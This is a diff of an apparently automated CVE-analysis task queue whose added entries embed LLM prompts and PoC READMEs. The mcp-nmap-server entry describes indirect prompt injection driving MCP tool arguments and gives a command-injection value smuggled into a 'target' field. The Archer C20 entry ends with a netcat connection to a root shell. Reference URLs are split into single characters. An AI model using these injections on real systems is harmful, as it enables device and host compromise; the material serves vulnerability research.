@@ -10,7 +10,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787297739.9316764,
     "last_attempt": 1787319549.8266568,
-    "next_attempt": 1787429610.2524579,
+    "next_attempt": 1787433221.320882,
     "metadata": {},
     "task_id": "task_CVE-2026-41089_1787297739",
     "required_result_fields": [
@@ -39,7 +39,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787297745.549952,
     "last_attempt": 1787325883.2471697,
-    "next_attempt": 1787429610.2313616,
+    "next_attempt": 1787433234.3428252,
     "metadata": {},
     "task_id": "task_CVE-2026-31431_1787297745",
     "required_result_fields": [
@@ -68,7 +68,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787300939.4342928,
     "last_attempt": 1787319549.8306162,
-    "next_attempt": 1787429600.2392025,
+    "next_attempt": 1787433222.947788,
     "metadata": {},
     "task_id": "task_CVE-2025-21479_1787300939",
     "required_result_fields": [
@@ -97,7 +97,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787311074.4644175,
     "last_attempt": 1787325888.253165,
-    "next_attempt": 1787429605.077819,
+    "next_attempt": 1787433220.7389321,
     "metadata": {},
     "task_id": "task_CVE-2026-41567_1787311074",
     "required_result_fields": [
@@ -126,7 +126,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787319530.6961913,
     "last_attempt": 1787393660.3489459,
-    "next_attempt": 1787429643.2285187,
+    "next_attempt": 1787433253.6302722,
     "metadata": {},
     "task_id": "task_CVE-2026-64824_1787319530",
     "required_result_fields": [
@@ -155,7 +155,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787319536.874543,
     "last_attempt": 1787325893.261153,
-    "next_attempt": 1787429606.914757,
+    "next_attempt": 1787433233.971138,
     "metadata": {},
     "task_id": "task_CVE-2026-69084_1787319536",
     "required_result_fields": [
@@ -184,7 +184,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787319543.014567,
     "last_attempt": 1787332839.048892,
-    "next_attempt": 1787429604.9228776,
+    "next_attempt": 1787433225.9034753,
     "metadata": {},
     "task_id": "task_CVE-2026-34910_1787319543",
     "required_result_fields": [
@@ -213,7 +213,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787319549.8244288,
     "last_attempt": 1787332839.04993,
-    "next_attempt": 1787429595.1502652,
+    "next_attempt": 1787433232.050612,
     "metadata": {},
     "task_id": "task_CVE-2026-64638_1787319549",
     "required_result_fields": [
@@ -242,7 +242,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787322326.2119212,
     "last_attempt": 1787332839.0551023,
-    "next_attempt": 1787429609.9035547,
+    "next_attempt": 1787433220.516687,
     "metadata": {},
     "task_id": "task_CVE-2026-43499_1787322326",
     "required_result_fields": [
@@ -271,7 +271,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787325878.238712,
     "last_attempt": 1787369685.49496,
-    "next_attempt": 1787429604.1070204,
+    "next_attempt": 1787433229.1946816,
     "metadata": {},
     "task_id": "task_CVE-2026-76036_1787325878",
     "required_result_fields": [
@@ -300,7 +300,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787325894.7760024,
     "last_attempt": 1787369689.99084,
-    "next_attempt": 1787429609.8222723,
+    "next_attempt": 1787433229.1504462,
     "metadata": {},
     "task_id": "task_CVE-2025-69212_1787325894",
     "required_result_fields": [
@@ -329,7 +329,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787332829.3113477,
     "last_attempt": 1787369689.99303,
-    "next_attempt": 1787429608.18715,
+    "next_attempt": 1787433231.939268,
     "metadata": {},
     "task_id": "task_CVE-2026-76564_1787332829",
     "required_result_fields": [
@@ -358,7 +358,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787332834.0378146,
     "last_attempt": 1787369690.0024693,
-    "next_attempt": 1787429601.9274924,
+    "next_attempt": 1787433223.581256,
     "metadata": {},
     "task_id": "task_CVE-2026-76565_1787332834",
     "required_result_fields": [
@@ -387,7 +387,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787336621.9227014,
     "last_attempt": 1787369690.0039268,
-    "next_attempt": 1787429597.4302487,
+    "next_attempt": 1787433226.9182348,
     "metadata": {},
     "task_id": "task_CVE-2026-65400_1787336621",
     "required_result_fields": [
@@ -416,7 +416,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787336628.1848502,
     "last_attempt": 1787369690.0110717,
-    "next_attempt": 1787429599.2094924,
+    "next_attempt": 1787433230.879983,
     "metadata": {},
     "task_id": "task_CVE-2026-48907_1787336628",
     "required_result_fields": [
@@ -445,7 +445,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787346910.500986,
     "last_attempt": 1787375972.387586,
-    "next_attempt": 1787429602.6362402,
+    "next_attempt": 1787433230.7904546,
     "metadata": {},
     "task_id": "task_CVE-2026-32475_1787346910",
     "required_result_fields": [
@@ -474,7 +474,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787346916.5528212,
     "last_attempt": 1787375967.3777978,
-    "next_attempt": 1787429597.4377966,
+    "next_attempt": 1787433224.7243807,
     "metadata": {},
     "task_id": "task_CVE-2026-26980_1787346916",
     "required_result_fields": [
@@ -503,7 +503,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787354120.4442868,
     "last_attempt": 1787375972.3893163,
-    "next_attempt": 1787429601.1140518,
+    "next_attempt": 1787433230.3625226,
     "metadata": {},
     "task_id": "task_CVE-2026-69836_1787354120",
     "required_result_fields": [
@@ -532,7 +532,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787364612.6322472,
     "last_attempt": 1787393655.33484,
-    "next_attempt": 1787429597.0136108,
+    "next_attempt": 1787433234.047373,
     "metadata": {},
     "task_id": "task_CVE-2026-72844_1787364612",
     "required_result_fields": [
@@ -561,7 +561,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787369685.4901898,
     "last_attempt": 1787393655.3335006,
-    "next_attempt": 1787429602.2967262,
+    "next_attempt": 1787433226.2976546,
     "metadata": {},
     "task_id": "task_CVE-2026-66747_1787369685",
     "required_result_fields": [
@@ -590,7 +590,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787369689.9857407,
     "last_attempt": 1787393655.3407164,
-    "next_attempt": 1787429601.6239672,
+    "next_attempt": 1787433226.1868818,
     "metadata": {},
     "task_id": "task_CVE-2026-57827_1787369689",
     "required_result_fields": [
@@ -619,7 +619,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787375973.1340733,
     "last_attempt": 1787422582.0234716,
-    "next_attempt": 1787429601.9607604,
+    "next_attempt": 1787433232.0883927,
     "metadata": {},
     "task_id": "task_CVE-2026-53787_1787375973",
     "required_result_fields": [
@@ -648,7 +648,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787393639.877276,
     "last_attempt": 1787422587.0296874,
-    "next_attempt": 1787429598.636715,
+    "next_attempt": 1787433226.371321,
     "metadata": {},
     "task_id": "task_CVE-2026-64561_1787393639",
     "required_result_fields": [
@@ -677,7 +677,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787393645.324519,
     "last_attempt": 1787422587.0316632,
-    "next_attempt": 1787429600.1223712,
+    "next_attempt": 1787433228.1143768,
     "metadata": {},
     "task_id": "task_CVE-2026-45585_1787393645",
     "required_result_fields": [
@@ -706,7 +706,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787397197.457568,
     "last_attempt": 1787422587.0433125,
-    "next_attempt": 1787429598.178724,
+    "next_attempt": 1787433228.2731287,
     "metadata": {},
     "task_id": "task_CVE-2026-41940_1787397197",
     "required_result_fields": [
@@ -735,7 +735,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787401231.3163497,
     "last_attempt": 1787422587.0450406,
-    "next_attempt": 1787429596.1575978,
+    "next_attempt": 1787433230.315595,
     "metadata": {},
     "task_id": "task_CVE-2026-19478_1787401231",
     "required_result_fields": [
@@ -764,7 +764,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787415209.7988935,
     "last_attempt": 1787422577.0106502,
-    "next_attempt": 1787429586.4896548,
+    "next_attempt": 1787433204.7229598,
     "metadata": {},
     "task_id": "task_CVE-2026-9198_1787415209",
     "required_result_fields": [
@@ -793,7 +793,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787422572.002747,
     "last_attempt": 1787429584.2526386,
-    "next_attempt": 1787429626.4058754,
+    "next_attempt": 1787433230.2272115,
     "metadata": {},
     "task_id": "task_CVE-2026-13736_1787422572",
     "required_result_fields": [
@@ -822,7 +822,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787426186.9303896,
     "last_attempt": 1787429584.2544787,
-    "next_attempt": 1787429603.365858,
+    "next_attempt": 1787433209.2631896,
     "metadata": {},
     "task_id": "task_CVE-2026-39987_1787426186",
     "required_result_fields": [
@@ -851,7 +851,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787429573.740005,
     "last_attempt": 1787429579.2764146,
-    "next_attempt": 1787429589.5969424,
+    "next_attempt": 1787433199.8224535,
     "metadata": {},
     "task_id": "task_CVE-2026-58231_1787429573",
     "required_result_fields": [
@@ -880,7 +880,7 @@
     "last_error": "API返回空结果",
     "created_at": 1787429579.2696884,
     "last_attempt": 1787429584.268029,
-    "next_attempt": 1787429595.3898575,
+    "next_attempt": 1787433197.3341715,
     "metadata": {},
     "task_id": "task_CVE-2026-76904_1787429579",
     "required_result_fields": [
@@ -901,17 +901,46 @@
   {
     "cve_id": "CVE-2026-3484",
     "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-3484\", \"sources\": [\"NVD\", \"OSCS\"], \"descriptions\": [\"A vulnerability was detected in PhialsBasement nmap-mcp-server up to bee6d23547d57ae02460022f7c78ac0893092e38. Affected by this issue is the function child_process.exec of the file src/index.ts of the component Nmap CLI Command Handler. The manipulation results in command injection. The attack may be performed from remote. This product utilizes a rolling release system for continuous delivery, and as such, version information for affected or updated releases is not disclosed. The patch is identified as 30a6b9e1c7fa6146f51e28d6ab83a2568d9a3488. It is best practice to apply a patch to resolve this issue.\", \"\\u6807\\u9898: nmap-mcp-server \\u547d\\u4ee4\\u6ce8\\u5165\\u6f0f\\u6d1e\"], \"published_date\": \"2026-03-03T20:16:50.430\", \"last_modified_date\": \"2026-06-17T10:43:39.480\", \"cvss_score\": 6.3, \"severity\": \"MEDIUM\", \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"P\", \"h\", \"i\", \"a\", \"l\", \"s\", \"B\", \"a\", \"s\", \"e\", \"m\", \"e\", \"n\", \"t\", \"/\", \"n\", \"m\", \"a\", \"p\", \"-\", \"m\", \"c\", \"p\", \"-\", \"s\", \"e\", \"r\", \"v\", \"e\", \"r\", \"/\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"P\", \"h\", \"i\", \"a\", \"l\", \"s\", \"B\", \"a\", \"s\", \"e\", \"m\", \"e\", \"n\", \"t\", \"/\", \"n\", \"m\", \"a\", \"p\", \"-\", \"m\", \"c\", \"p\", \"-\", \"s\", \"e\", \"r\", \"v\", \"e\", \"r\", \"/\", \"c\", \"o\", \"m\", \"m\", \"i\", \"t\", \"/\", \"3\", \"0\", \"a\", \"6\", \"b\", \"9\", \"e\", \"1\", \"c\", \"7\", \"f\", \"a\", \"6\", \"1\", \"4\", \"6\", \"f\", \"5\", \"1\", \"e\", \"2\", \"8\", \"d\", \"6\", \"a\", \"b\", \"8\", \"3\", \"a\", \"2\", \"5\", \"6\", \"8\", \"d\", \"9\", \"a\", \"3\", \"4\", \"8\", \"8\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"P\", \"h\", \"i\", \"a\", \"l\", \"s\", \"B\", \"a\", \"s\", \"e\", \"m\", \"e\", \"n\", \"t\", \"/\", \"n\", \"m\", \"a\", \"p\", \"-\", \"m\", \"c\", \"p\", \"-\", \"s\", \"e\", \"r\", \"v\", \"e\", \"r\", \"/\", \"i\", \"s\", \"s\", \"u\", \"e\", \"s\", \"/\", \"7\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"P\", \"h\", \"i\", \"a\", \"l\", \"s\", \"B\", \"a\", \"s\", \"e\", \"m\", \"e\", \"n\", \"t\", \"/\", \"n\", \"m\", \"a\", \"p\", \"-\", \"m\", \"c\", \"p\", \"-\", \"s\", \"e\", \"r\", \"v\", \"e\", \"r\", \"/\", \"i\", \"s\", \"s\", \"u\", \"e\", \"s\", \"/\", \"7\", \"#\", \"i\", \"s\", \"s\", \"u\", \"e\", \"c\", \"o\", \"m\", \"m\", \"e\", \"n\", \"t\", \"-\", \"3\", \"8\", \"1\", \"4\", \"3\", \"8\", \"2\", \"5\", \"7\", \"0\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"v\", \"u\", \"l\", \"d\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"?\", \"c\", \"t\", \"i\", \"i\", \"d\", \".\", \"3\", \"4\", \"8\", \"5\", \"5\", \"9\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"v\", \"u\", \"l\", \"d\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"?\", \"i\", \"d\", \".\", \"3\", \"4\", \"8\", \"5\", \"5\", \"9\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"v\", \"u\", \"l\", \"d\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"?\", \"s\", \"u\", \"b\", \"m\", \"i\", \"t\", \".\", \"7\", \"6\", \"3\", \"7\", \"7\", \"3\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"v\", \"u\", \"l\", \"d\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"?\", \"s\", \"u\", \"b\", \"m\", \"i\", \"t\", \".\", \"7\", \"6\", \"3\", \"7\", \"7\", \"7\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] GitHub - SecureWithUmer/CVE-2026-PoCs: A community-curated, verified collection of Proof-of-Concept exploits for CVEs disclosed in 2026. · GitHub\n [description] A community-curated, verified collection of Proof-of-Concept exploits for CVEs disclosed in 2026. - SecureWithUmer/CVE-2026-PoCs\n [link] https://github.com/SecureWithUmer/CVE-2026-PoCs\n [webpage 0 end]\n[webpage 1 begin] [title] GitHub - XZ1r0/cve-2026-poc-collection: CVE-2026 PoC Collection - 128 PoCs covering 84 CVEs · GitHub\n [description] CVE-2026 PoC Collection - 128 PoCs covering 84 CVEs - XZ1r0/cve-2026-poc-collection\n [link] https://github.com/XZ1r0/cve-2026-poc-collection\n [webpage 1 end]\n[webpage 2 begin] [title] cve-2026-poc-collection/REPORT.md at main · XZ1r0/cve-2026-poc-collection\n [description] CVE-2026 PoC Collection - 128 PoCs covering 84 CVEs - XZ1r0/cve-2026-poc-collection\n [link] https://github.com/XZ1r0/cve-2026-poc-collection/blob/main/REPORT.md\n [webpage 2 end]\n[webpage 3 begin] [title] DayDayPoc\n [description] 登录 · poc提交 · 漏洞列表 · 漏洞环境 · 排行榜 · 插件下载 · 资产测绘 · 首页\n [link] https://www.ddpoc.com/\n [webpage 3 end]\n[webpage 4 begin] [title] GitHub - zulloper/cve-poc: CVE POC repo 자동 수집기 · GitHub\n [description] Guest-to-host KVM/x86 escape exploiting CVE-2026-64561, delivering a full PoC chain and analysis for...\n [link] https://github.com/zulloper/cve-poc\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/091118b713dc766571ee4d3ad714c169/LICENSE\n---\nMIT License\n\nCopyright (c) 2026 s1ko\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n\n\n---\n/tmp/091118b713dc766571ee4d3ad714c169/README.md\n---\n# CVE-2026-52616 — mcp-nmap-server: OS command injection via `run_nmap_scan`\n\nThe `run_nmap_scan` MCP tool builds its command by string interpolation of the\n`target` and `additionalFlags` parameters and runs it through\n`child_process.exec`, i.e. `/bin/sh -c`.\n\n> ## ⚠ Read this first — duplicate identifier\n>\n> **This vulnerability was already public before this CVE ID existed.** It is\n> covered by **[CVE-2026-3484](https://nvd.nist.gov/vuln/detail/CVE-2026-3484)\n> / [GHSA-xc68-rrqc-qgq3](https://github.com/advisories/GHSA-xc68-rrqc-qgq3)**,\n> assigned by VulDB and published 2026-03-03 against `mcp-nmap-server <= 1.0.1`\n> — same package, same CWE-78 `child_process.exec` sink.\n>\n> CVE-2026-52616 was assigned to s1ko by MITRE CNA-LR on 2026-07-13 in response\n> to an independent report. That assignment appears to be a **duplicate**, and\n> it has been flagged as such. The pre-existing identifier CVE-2026-3484 is the\n> one that should be cited.\n>\n> This repository is published for completeness and to document the duplicate,\n> **not** as a claim of novel discovery. The credit for the original public\n> disclosure is not s1ko's.\n\n| | |\n|---|---|\n| CVE | CVE-2026-52616 — **duplicate of CVE-2026-3484** |\n| CWE | CWE-78 (Improper Neutralization of Special Elements used in an OS Command) |\n| Package | [`mcp-nmap-server`](https://www.npmjs.com/package/mcp-nmap-server) (npm) |\n| Affected | 1.0.1 and earlier — **all published versions** |\n| Fixed in | none — repository archived |\n| CVSS v3.1 | `AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = **7.8 High** (stdio transport). `AV:N` → 9.8 Critical if the server is wrapped in a network transport. |\n| Independently reported by | s1ko ([github.com/s1ko](https://github.com/s1ko), `s1ko@riseup.net`) |\n| CVE assigned | 2026-07-13, MITRE CNA-LR |\n\nA naming trap worth noting for anyone deduplicating this: the npm package is\n`mcp-nmap-server` and the repository is `nmap-mcp-server`. The two orderings\nrefer to the same project.\n\n## Threat model\n\nMCP tool arguments are attacker-influenced. They are produced by an LLM from\nthe content the agent processes — documents, web pages, tool output — so\nindirect prompt injection puts an attacker in control of the values a tool\nhandler receives. A handler that feeds any of those values into a shell turns\nthat influence into code execution on the host running the MCP server. This is\nthe same model as the precedent case `aws-mcp-server` / CVE-2026-5058.\n\n## Execution\n\n`dist/index.js` — the target is appended to a command string which is then\nhanded to `exec`:\n\n```js\ncommand += ` ${target}`;\n…\nconst { stdout, stderr } = await promisify(exec)(command);\n```\n\n`child_process.exec` runs its argument in `/bin/sh -c`, so everything the\ncaller contributed is shell syntax. The Zod input schema declares `z.string()`,\nwhich validates type and says nothing about content, so metacharacters pass\nthrough. `additionalFlags` reaches the same string by the same route.\n\nA `run_nmap_scan` call with `target` set to\n`127.0.0.1; touch /tmp/marker; echo INJECTED` produces:\n\n```\n/bin/sh -c \"nmap … 127.0.0.1; touch /tmp/marker; echo INJECTED\"\n```\n\n### Reproduction\n\n[`poc/driver.mjs`](poc/driver.mjs) speaks MCP over stdio: it initializes the\nserver, issues one `tools/call` for `run_nmap_scan` with an injected `target`,\nand checks for a marker file. The payload is a benign `touch`.\n\n```\nnpm pack mcp-nmap-server@1.0.1\ntar xf mcp-nmap-server-1.0.1.tgz && cd package && npm install\nnode ../poc/driver.mjs\n```\n\nExpected on an affected version:\n\n```\n==== POC RESULT (mcp-nmap-server) ====\nmarker /tmp/PWNED_nmap created: true\nverdict: CONFIRMED — command injection executed\n```\n\n`nmap` does not need to be installed — the injected command runs in the same\n`/bin/sh -c` string regardless of whether the leading binary resolves.\nValidated 2026-06-01 in an \n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
+    "retry_count": 1,
+    "max_retries": 5,
+    "priority": 2,
+    "status": "pending",
+    "error_type": "client_error",
+    "last_error": "API返回空结果",
+    "created_at": 1787429584.245851,
+    "last_attempt": 1787433193.076627,
+    "next_attempt": 1787433203.0353835,
+    "metadata": {},
+    "task_id": "task_CVE-2026-3484_1787429584",
+    "required_result_fields": [
+      "poc_available",
+      "condition",
+      "fix",
+      "risk_level",
+      "summary",
+      "attack_vector",
+      "affected_component",
+      "poison",
+      "markdown",
+      "repo_name",
+      "repo_url",
+      "cve_url"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-75616",
+    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-75616\", \"sources\": [\"NVD\", \"OSCS\"], \"descriptions\": [\"An OS command injection vulnerability exists in the web management interface of Archer C20 v6 firmware when processing certain WAN-related configuration operations. An authenticated administrator may exploit insufficient input validation to execute arbitrary system commands, potentially resulting in full device compromise.\\n\\n\\n\\n\\n\\n\\nSuccessful exploitation may allow arbitrary command execution with elevated privileges, compromising the confidentiality, integrity, and availability of the affected device\\u00a0and network traffic passing through it.\", \"\\u6807\\u9898: TP-Link Archer C20 v6 \\u547d\\u4ee4\\u6ce8\\u5165\\u6f0f\\u6d1e\"], \"published_date\": \"2026-08-19T21:17:37.917\", \"last_modified_date\": \"2026-08-20T16:18:03.890\", \"cvss_score\": null, \"severity\": null, \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"t\", \"p\", \"-\", \"l\", \"i\", \"n\", \"k\", \".\", \"c\", \"o\", \"m\", \"/\", \"e\", \"n\", \"/\", \"s\", \"u\", \"p\", \"p\", \"o\", \"r\", \"t\", \"/\", \"d\", \"o\", \"w\", \"n\", \"l\", \"o\", \"a\", \"d\", \"/\", \"a\", \"r\", \"c\", \"h\", \"e\", \"r\", \"-\", \"c\", \"2\", \"0\", \"/\", \"v\", \"6\", \"/\", \"#\", \"F\", \"i\", \"r\", \"m\", \"w\", \"a\", \"r\", \"e\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"t\", \"p\", \"-\", \"l\", \"i\", \"n\", \"k\", \".\", \"c\", \"o\", \"m\", \"/\", \"e\", \"n\", \"/\", \"s\", \"u\", \"p\", \"p\", \"o\", \"r\", \"t\", \"/\", \"f\", \"a\", \"q\", \"/\", \"5\", \"2\", \"5\", \"2\", \"/\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"t\", \"p\", \"-\", \"l\", \"i\", \"n\", \"k\", \".\", \"c\", \"o\", \"m\", \"/\", \"u\", \"s\", \"/\", \"s\", \"u\", \"p\", \"p\", \"o\", \"r\", \"t\", \"/\", \"d\", \"o\", \"w\", \"n\", \"l\", \"o\", \"a\", \"d\", \"/\", \"a\", \"r\", \"c\", \"h\", \"e\", \"r\", \"-\", \"c\", \"2\", \"0\", \"/\", \"v\", \"6\", \".\", \"4\", \"6\", \"/\", \"#\", \"F\", \"i\", \"r\", \"m\", \"w\", \"a\", \"r\", \"e\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] GitHub - SecureWithUmer/CVE-2026-PoCs: A community-curated, verified collection of Proof-of-Concept exploits for CVEs disclosed in 2026. · GitHub\n [description] A community-curated, verified collection of Proof-of-Concept exploits for CVEs disclosed in 2026. - SecureWithUmer/CVE-2026-PoCs\n [link] https://github.com/SecureWithUmer/CVE-2026-PoCs\n [webpage 0 end]\n[webpage 1 begin] [title] CVE-2026-75616 - Command Injection in Router Web Management Interface\n [description] 2 days ago - An OS command injection vulnerability exists in the web management interface of Archer C20 v6 firmware when processing certain WAN-related configuration operations. An authenticated administrator may exploit insufficient input validation to ...\n [link] https://cvefeed.io/vuln/detail/CVE-2026-75616\n [webpage 1 end]\n[webpage 2 begin] [title] cve-2026-poc-collection/REPORT.md at main · XZ1r0/cve-2026-poc-collection\n [description] CVE-2026 PoC Collection - 128 PoCs covering 84 CVEs - XZ1r0/cve-2026-poc-collection\n [link] https://github.com/XZ1r0/cve-2026-poc-collection/blob/main/REPORT.md\n [webpage 2 end]\n[webpage 3 begin] [title] GitHub - XZ1r0/cve-2026-poc-collection: CVE-2026 PoC Collection - 128 PoCs covering 84 CVEs · GitHub\n [description] CVE-2026 PoC Collection - 128 PoCs covering 84 CVEs - XZ1r0/cve-2026-poc-collection\n [link] https://github.com/XZ1r0/cve-2026-poc-collection\n [webpage 3 end]\n[webpage 4 begin] [title] PocOrExp_in_Github/Today.md at main · ycdxsb/PocOrExp_in_Github\n [description] Automatically Collect POC or EXP from GitHub by CVE ID. - ycdxsb/PocOrExp_in_Github\n [link] https://github.com/ycdxsb/PocOrExp_in_Github/blob/main/Today.md\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/56ad210147699f28495e6318642b96bb/README.md\n---\n# CVE-2026-75616\n\nAuthenticated OS command injection in the TP-Link Archer C20 v6 web management interface. \n\nBPA WAN configuration values are passed to `system()` without adequate neutralization, allowing an authenticated administrator on the adjacent network to execute commands as root.\n\nDiscovered and reported by Daniil Gordeev ([totekuh](https://github.com/totekuh)).\n\n## Affected Versions\n\n- Archer C20 v6 EU firmware earlier than `0.9.1 Build 260811`\n- Archer C20 v6 US firmware earlier than `0.9.1 Build 260812`\n- Archer C20 v6 RU firmware earlier than `0.9.1 Build 260812`\n\n## Requirements\n\n- Administrator credentials\n- Access to the router's LAN web interface\n- WAN connected to a network that provides DHCP\n- Python 3, `requests`, and `pycryptodome`\n\n## Usage\n\n```bash\npython3 -m pip install requests pycryptodome\npython3 bpa-poc.py --target 192.168.0.1 --password '<admin-password>'\nnc 192.168.0.1 4445\n```\n\nUse `--list-only` to enumerate WAN instances without triggering the command\ninjection.\n\n## References\n\n- [TP-Link 